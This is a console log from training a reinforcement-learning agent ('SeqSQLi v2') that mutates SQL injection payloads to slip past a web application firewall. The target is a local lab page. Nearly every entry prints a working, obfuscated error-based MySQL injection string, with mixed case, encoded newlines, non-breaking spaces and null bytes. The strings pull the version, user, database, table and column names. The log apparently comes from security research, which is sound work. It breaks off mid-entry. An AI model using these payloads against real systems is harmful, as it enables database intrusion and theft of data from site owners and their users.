/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
 Seed        : 3
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-46.00
  [BYPASS] Ep 5446 | steps=6 | seq=agg_swap -> case -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnd%0aEXP(~(SelEct%0a*%0afRom%0a(sELecT%0a((sELect%0aJSON_ARRAYAGG(schema_name)%0afrOm%0aiNForMAtION_scHEma.schemata)))a));%00
  [BYPASS] Ep 5448 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 5450 | SR=30% | Steps=12.1 | R=-24.18
  [BYPASS] Ep 5451 | steps=4 | seq=null_byte -> newline -> case -> func_sp_nbsp
           payload: 1'%0aaND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 5452 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(sELeCT%0a*%0afrOM%0a(sElEcT%0a(version%a0()))a));%00
  [BYPASS] Ep 5455 | steps=5 | seq=agg_swap -> null_byte -> newline -> func_sp_nbsp -> case
           payload: 1'%0aAnD%0aEXP(~(sELeCt%0a*%0aFrOM%0a(SelEct%0a(user%a0()))a));%00
  [BYPASS] Ep 5456 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aanD%0aEXP(~(sELECt%0a*%0aFroM%0a(selecT%0a((seLEct%0aJSON_ARRAYAGG(CoNCat(TaBLe_schema,CHAR(46),TABLe_name))%0afroM%0aInForMatiOn_Schema.tABLes%0
  [BYPASS] Ep 5458 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 5460 | SR=50% | Steps=9.7 | R=-14.71
  [BYPASS] Ep 5470 | steps=5 | seq=case -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnd%0aEXP(~(SeLECT%0a*%0aFrOm%0a(selEcT%0a((seleCT%0aJSON_ARRAYAGG(schema_name)%0aFROm%0aInFormAtion_SChEMA.schemata)))a));%00
  Ep 5470 | SR=10% | Steps=14.0 | R=-30.44
  [BYPASS] Ep 5472 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 5475 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aanD%0aEXP(~(SeleCt%0a*%0aFRoM%0a(sELeCt%0a((SElEcT%0aJSON_ARRAYAGG(coNcaT(table_schema,CHAR(46),tABLE_name))%0afrom%0aINFoRmatIOn_SChEMa.tABles%0
  [BYPASS] Ep 5476 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 5480 | SR=30% | Steps=11.7 | R=-19.53
  [BYPASS] Ep 5483 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaNd%0aEXP(~(SELEcT%0a*%0aFRoM%0a(selecT%0a((seLeCt%0aJSON_ARRAYAGG(coNcat(Table_schema,CHAR(46),tAblE_name))%0aFrOm%0aInFORmAtiON_sChema.taBlEs%0
  Ep 5490 | SR=10% | Steps=14.1 | R=-31.61
  [BYPASS] Ep 5496 | steps=4 | seq=null_byte -> newline -> case -> func_sp_nbsp
           payload: 1'%0aaNd%0aGTID_SUBSET((user%a0()),1);%00
  Ep 5500 | SR=10% | Steps=13.9 | R=-31.43
  Ep 5510 | SR=0% | Steps=15.0 | R=-33.25
  [BYPASS] Ep 5514 | steps=5 | seq=concat_char -> null_byte -> newline -> case -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 5520 | SR=10% | Steps=14.0 | R=-30.97
  [BYPASS] Ep 5524 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 5526 | steps=5 | seq=case -> null_byte -> newline -> case -> func_sp_nbsp
           payload: 1'%0aand%0aGTID_SUBSET((version%a0()),1);%00
  Ep 5530 | SR=20% | Steps=12.8 | R=-26.48
  [BYPASS] Ep 5532 | steps=8 | seq=case -> null_byte -> newline -> case -> case -> case -> case -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SELeCt%0a*%0aFRoM%0a(SelECt%0a(version%a0()))a));%00
  [BYPASS] Ep 5535 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SelecT%0a*%0afrom%0a(SElecT%0a(version%a0()))a));%00
  Ep 5540 | SR=20% | Steps=13.2 | R=-25.70
  [BYPASS] Ep 5542 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 5549 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 5550 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 5550 | SR=30% | Steps=11.6 | R=-21.54
  [BYPASS] Ep 5554 | steps=5 | seq=case -> null_byte -> newline -> func_sp_nbsp -> agg_swap
           payload: 1'%0aand%0aEXP(~(sElect%0a*%0aFRoM%0a(SElect%0a((SeLEcT%0aJSON_ARRAYAGG(column_name)%0aFroM%0ainFOrMATION_SChemA.columns%0aWheRe%0atable_schema=DaTAbA
  Ep 5560 | SR=10% | Steps=14.0 | R=-31.27
  [BYPASS] Ep 5564 | steps=15 | seq=agg_swap -> case -> null_byte -> newline -> case -> case -> case -> case -> case -> case -> case -> case -> case -> case -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(SelECT%0a*%0aFrom%0a(seleCt%0a(user%a0()))a));%00
  [BYPASS] Ep 5570 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SElEct%0a*%0afRom%0a(sEleCt%0a(version%a0()))a));%00
  Ep 5570 | SR=20% | Steps=13.9 | R=-29.24
  [BYPASS] Ep 5580 | steps=4 | seq=dot_prefix -> null_byte -> newline -> func_sp_nbsp
           payload: .11'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 5580 | SR=10% | Steps=13.9 | R=-29.48
  [BYPASS] Ep 5584 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(sEleCt%0a*%0aFROm%0a(SELEcT%0a(version%a0()))a));%00
  [BYPASS] Ep 5589 | steps=5 | seq=func_sp_nbsp -> case -> case -> null_byte -> newline
           payload: 1'%0aAnd%0aGTID_SUBSET((user%a0()),1);%00
  Ep 5590 | SR=20% | Steps=12.9 | R=-27.63
  [BYPASS] Ep 5592 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 5597 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 5600 | SR=20% | Steps=12.6 | R=-25.02
  [BYPASS] Ep 5608 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAND%0aEXP(~(SeLecT%0a*%0aFrOM%0a(sElecT%0a((SEleCT%0aJSON_ARRAYAGG(coNcAt(TaBLe_schema,CHAR(46),tABLE_name))%0aFROM%0aInFOrMAtIOn_SchEma.TaBlEs%0
  Ep 5610 | SR=10% | Steps=14.1 | R=-30.99
  [BYPASS] Ep 5616 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SeLeCt%0a*%0afrOM%0a(sELect%0a(DaTabASe%a0()))a));%00
  Ep 5620 | SR=10% | Steps=13.9 | R=-29.84
  [BYPASS] Ep 5621 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 5625 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 5626 | steps=5 | seq=case -> hex_to_char -> agg_swap -> null_byte -> newline
           payload: 1'%0aanD%0aEXP(~(seLEcT%0a*%0afRoM%0a(SELEcT%0a((SeLEcT%0aJSON_ARRAYAGG(CONCAT(tAblE_schema,CHAR(46),tABlE_name))%0aFrOM%0aiNfoRmatION_scheMA.tABLes%0
  [BYPASS] Ep 5630 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(sELECT%0a*%0aFROM%0a(seLEct%0a(DaTABaSE%a0()))a));%00
  Ep 5630 | SR=40% | Steps=10.7 | R=-18.12
  [BYPASS] Ep 5631 | steps=6 | seq=case -> null_byte -> func_sp_nbsp -> case -> null_byte -> newline
           payload: 1'%0aAnd%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 5633 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(selEct%0a*%0afROM%0a(SeleCT%0a((SElEct%0acoNcAt(CHAR(124),JSON_ARRAYAGG(TabLE_name),CHAR(124))%0aFROm%0aInFOrMATIon_sCHEMA.TabLes%0aW
  Ep 5640 | SR=20% | Steps=13.3 | R=-28.09
  [BYPASS] Ep 5644 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 5650 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 5650 | SR=20% | Steps=12.6 | R=-26.98
  [BYPASS] Ep 5652 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(SELect%0a*%0afrOM%0a(sElECT%0a(dAtAbASE%a0()))a));%00
  [BYPASS] Ep 5655 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aGTID_SUBSET((version%a0()),1);%00
  Ep 5660 | SR=20% | Steps=12.8 | R=-26.74
  [BYPASS] Ep 5662 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(SelEcT%0a*%0afrOm%0a(seLEct%0a(user%a0()))a));%00
  [BYPASS] Ep 5663 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 5670 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 5670 | SR=30% | Steps=11.5 | R=-22.19
  [BYPASS] Ep 5672 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 5673 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 5680 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SeleCt%0a*%0aFrom%0a(seleCt%0a(user%a0()))a));%00
  Ep 5680 | SR=30% | Steps=11.5 | R=-21.04
  [BYPASS] Ep 5682 | steps=5 | seq=case -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SEleCT%0a*%0aFRoM%0a(selecT%0a(version%a0()))a));%00
  [BYPASS] Ep 5683 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sElEcT%0a*%0afROm%0a(SElect%0a(user%a0()))a));%00
  [BYPASS] Ep 5687 | steps=11 | seq=case -> hex_to_char -> double_or -> case -> case -> case -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(sELecT%0a*%0afROM%0a(SEleCT%0a((SELeCt%0acoNCAt(CHAR(124),JSON_ARRAYAGG(TaBle_name),CHAR(124))%0aFrOm%0aiNFoRmAtiOn_scHEMa.tabLEs%0aW
  Ep 5690 | SR=30% | Steps=12.5 | R=-24.80
  Ep 5700 | SR=0% | Steps=15.0 | R=-35.21
  Ep 5710 | SR=0% | Steps=15.0 | R=-34.62
  [BYPASS] Ep 5717 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((DAtaBASe%a0()),1);%00
  [BYPASS] Ep 5718 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(SELect%0a*%0aFrOm%0a(SELecT%0a(DaTABase%a0()))a));%00
  [BYPASS] Ep 5720 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 5720 | SR=30% | Steps=11.7 | R=-22.92
  [BYPASS] Ep 5722 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 5728 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SELeCt%0a*%0aFROm%0a(SelecT%0a((sELeCt%0aconcAt(CHAR(124),JSON_ARRAYAGG(TaBLe_name),CHAR(124))%0afrom%0ainfOrMaTIOn_scheMA.Tables%0aW
  Ep 5730 | SR=20% | Steps=13.0 | R=-27.00
  Ep 5740 | SR=0% | Steps=15.0 | R=-35.62
  Ep 5750 | SR=0% | Steps=15.0 | R=-34.02
  [BYPASS] Ep 5755 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aGTID_SUBSET((user%a0()),1);%00
  Ep 5760 | SR=10% | Steps=13.9 | R=-29.22
  [BYPASS] Ep 5763 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SeleCt%0a*%0afROm%0a(seLecT%0a(DatabASe%a0()))a));%00
  [BYPASS] Ep 5768 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SeLect%0a*%0afRom%0a(seLeCt%0a((sElECt%0aCoNcAT(CHAR(124),JSON_ARRAYAGG(TABLE_name),CHAR(124))%0aFRoM%0ainfORmATioN_ScHeMa.taBles%0aW
  [BYPASS] Ep 5769 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(seLECT%0a*%0afROM%0a(SELEcT%0a((sELect%0acOnCat(CHAR(124),JSON_ARRAYAGG(tAble_name),CHAR(124))%0afrom%0ainFOrmatioN_sCHemA.TaBles%0aW
  Ep 5770 | SR=30% | Steps=12.3 | R=-22.21
  [BYPASS] Ep 5775 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(seLeCt%0a*%0afRoM%0a(sElECt%0a(DaTAbAse%a0()))a));%00
  [BYPASS] Ep 5776 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(selEcT%0a*%0afROm%0a(sEleCt%0a((sElecT%0acoNCat(CHAR(124),JSON_ARRAYAGG(TAble_name),CHAR(124))%0aFRoM%0aINFOrMAtiOn_scHeMa.tabLes%0aW
  [BYPASS] Ep 5778 | steps=13 | seq=func_sp_nbsp -> case -> case -> case -> case -> case -> case -> case -> case -> case -> case -> null_byte -> newline
           payload: 1'%0aAnd%0aEXP(~(sELEct%0a*%0afRoM%0a(sELECt%0a(daTAbaSe%a0()))a));%00
  Ep 5780 | SR=30% | Steps=12.9 | R=-24.95
  Ep 5790 | SR=0% | Steps=15.0 | R=-33.69
  [BYPASS] Ep 5791 | steps=7 | seq=case -> null_byte -> newline -> double_encode -> case -> case -> func_sp_nbsp
           payload: 1'%0aAnD%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 5797 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SELEcT%0a*%0aFRoM%0a(sElEct%0a((SeLECT%0acoNcaT(CHAR(124),JSON_ARRAYAGG(TabLE_name),CHAR(124))%0aFrom%0aInForMAtIoN_sCHEma.tabLes%0aw
  [BYPASS] Ep 5799 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(seLECT%0a*%0afROM%0a(SelEcT%0a(DATaBase%a0()))a));%00
  Ep 5800 | SR=30% | Steps=12.3 | R=-23.38
  [BYPASS] Ep 5801 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SeLect%0a*%0afROM%0a(seLEct%0a(DAtAbAse%a0()))a));%00
  Ep 5810 | SR=10% | Steps=13.9 | R=-29.69
  [BYPASS] Ep 5811 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(selECT%0a*%0afrOm%0a(selecT%0a(user%a0()))a));%00
  [BYPASS] Ep 5813 | steps=6 | seq=case -> func_swap_err -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(selECT%0a*%0afRom%0a(sELECT%0a(version%a0()))a));%00
  [BYPASS] Ep 5820 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 5820 | SR=30% | Steps=11.8 | R=-23.64
  [BYPASS] Ep 5821 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aGTID_SUBSET((dAtaBASe%a0()),1);%00
  [BYPASS] Ep 5825 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 5830 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(sEleCt%0a*%0afROm%0a(SeLEct%0a(version%a0()))a));%00
  Ep 5830 | SR=30% | Steps=11.7 | R=-22.25
  [BYPASS] Ep 5833 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 5834 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SElECt%0a*%0afRoM%0a(sELECt%0a(dATABase%a0()))a));%00
  Ep 5840 | SR=20% | Steps=12.8 | R=-26.06
  [BYPASS] Ep 5843 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SeLECt%0a*%0afROm%0a(SELeCt%0a(version%a0()))a));%00
  [BYPASS] Ep 5844 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SeLEct%0a*%0aFrom%0a(SeleCT%0a((sElEct%0acOnCAt(CHAR(124),JSON_ARRAYAGG(TAblE_name),CHAR(124))%0afrOM%0ainforMatIon_sChEmA.TaBLes%0aw
  [BYPASS] Ep 5845 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SELect%0a*%0afrOm%0a(selecT%0a((SELEcT%0aCONCAt(CHAR(124),JSON_ARRAYAGG(Table_name),CHAR(124))%0afroM%0aiNFormatION_sChEmA.tabLes%0aw
  Ep 5850 | SR=30% | Steps=12.3 | R=-21.47
  [BYPASS] Ep 5858 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(seleCT%0a*%0afroM%0a(SeLEcT%0a(user%a0()))a));%00
  Ep 5860 | SR=10% | Steps=13.9 | R=-29.45
  [BYPASS] Ep 5867 | steps=6 | seq=case -> null_byte -> agg_swap -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SelECT%0a*%0aFrOm%0a(seLecT%0a((sELeCt%0aJSON_ARRAYAGG(Table_name)%0aFRom%0aINFOrMAtioN_SCHEMa.TABles%0aWhERe%0ataBle_schema=DATABaSe
  Ep 5870 | SR=10% | Steps=14.1 | R=-31.80
  [BYPASS] Ep 5873 | steps=8 | seq=case -> case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SEleCT%0a*%0afrOm%0a(SeLeCt%0a((SELecT%0acoNcAT(CHAR(124),JSON_ARRAYAGG(TABlE_name),CHAR(124))%0aFROM%0aiNfORMATioN_SChEMa.TAbLEs%0aW
  [BYPASS] Ep 5876 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(seLEcT%0a*%0afRoM%0a(SelecT%0a(DATabAsE%a0()))a));%00
  [BYPASS] Ep 5879 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 5880 | SR=30% | Steps=12.0 | R=-21.68
  [BYPASS] Ep 5881 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SELecT%0a*%0afRom%0a(SelECT%0a((sElECt%0aconcat(CHAR(124),JSON_ARRAYAGG(TAbLe_name),CHAR(124))%0afRom%0aINFOrMaTion_SCHEMa.TaBles%0aW
  [BYPASS] Ep 5882 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 5887 | steps=6 | seq=case -> hex_to_char -> agg_swap -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(sELect%0a*%0aFrOM%0a(SeLeCt%0a((SeLeCt%0acONCAT(CHAR(124),JSON_ARRAYAGG(TaBLe_name),CHAR(124))%0afroM%0aiNforMaTIon_SCheMA.TaBLes%0aw
  [BYPASS] Ep 5888 | steps=5 | seq=case -> hex_to_char -> agg_swap -> null_byte -> newline
           payload: 1'%0aAND%0aEXP(~(SeLECT%0a*%0aFrOm%0a(SeLECT%0a((SeLEcT%0aJSON_ARRAYAGG(CONCAT(TAbLE_schema,CHAR(46),taBLe_name))%0afrOM%0aInforMatION_ScHeMA.TaBLEs%0
  Ep 5890 | SR=40% | Steps=11.1 | R=-15.64
  [BYPASS] Ep 5893 | steps=4 | seq=null_byte -> newline -> func_swap_err -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 5899 | steps=4 | seq=null_byte -> newline -> func_sp_nbsp -> case
           payload: 1'%0aAnD%0aEXP(~(sELect%0a*%0afRoM%0a(SeleCT%0a(version%a0()))a));%00
  Ep 5900 | SR=20% | Steps=12.8 | R=-25.01
  [BYPASS] Ep 5907 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(seLEcT%0a*%0aFrOm%0a(SEleCT%0a(user%a0()))a));%00
  [BYPASS] Ep 5910 | steps=6 | seq=case -> hex_to_char -> agg_swap -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SeLECt%0a*%0aFrOM%0a(SelECt%0a((seLecT%0acoNcat(CHAR(124),JSON_ARRAYAGG(Table_name),CHAR(124))%0afRoM%0aiNFoRMation_SchEmA.tABles%0aW
  Ep 5910 | SR=20% | Steps=13.0 | R=-25.28
  [BYPASS] Ep 5911 | steps=4 | seq=null_byte -> newline -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(SELEct%0a*%0afROM%0a(SELect%0a(user%a0()))a));%00
  [BYPASS] Ep 5915 | steps=4 | seq=null_byte -> newline -> func_sp_nbsp -> case
           payload: 1'%0aanD%0aEXP(~(SELect%0a*%0afroM%0a(SeLEcT%0a(version%a0()))a));%00
  [BYPASS] Ep 5916 | steps=5 | seq=agg_swap -> null_byte -> newline -> func_sp_nbsp -> case
           payload: 1'%0aAnD%0aEXP(~(sELEcT%0a*%0afROM%0a(SELEct%0a((sElECT%0aJSON_ARRAYAGG(tAbLe_name)%0afRom%0aiNformaTiON_SChEMa.tAblEs%0aWhere%0aTaBlE_schema=DaTAbASE
  [BYPASS] Ep 5920 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 5920 | SR=40% | Steps=10.6 | R=-17.88
  [BYPASS] Ep 5922 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 5928 | steps=4 | seq=null_byte -> newline -> func_sp_nbsp -> case
           payload: 1'%0aAND%0aEXP(~(SeLECT%0a*%0aFROM%0a(SELECt%0a(datABaSe%a0()))a));%00
  [BYPASS] Ep 5930 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 5930 | SR=30% | Steps=11.5 | R=-20.47
  [BYPASS] Ep 5931 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> agg_swap -> null_byte -> newline
           payload: 1'%0aAnD%0aEXP(~(SElecT%0a*%0afrOM%0a(SeLEct%0a((SELeCt%0aJSON_ARRAYAGG(COnCAT(TAbLe_schema,CHAR(46),tABLE_name))%0aFrom%0aiNfoRMAtIoN_ScHema.taBLEs%0
  [BYPASS] Ep 5932 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 5933 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAND%0aEXP(~(selECt%0a*%0aFROM%0a(selECT%0a((sELeCT%0aJSON_ARRAYAGG(conCaT(tABLE_schema,CHAR(46),TAbLE_name))%0aFROm%0ainFoRmaTION_SChEma.tABLes%0
  [BYPASS] Ep 5937 | steps=6 | seq=func_sp_nbsp -> case -> agg_swap -> case -> null_byte -> newline
